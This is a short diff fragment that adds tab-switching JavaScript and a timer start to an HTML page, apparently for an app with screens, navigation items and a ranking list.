+        if (packets < 5) { startTimer(); }
+
+        function switchTab(screenId, event) {
+            document.querySelectorAll('.screen').forEach(s => {
+                if(s.id !== 'forcedTaskScreen') s.classList.remove('active');
+            });
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            event.currentTarget.classList.add('active');
+            if (screenId === 'rankingScreen') { updateRankingList(); }
+        }
     </script>
 </body>
 </html>
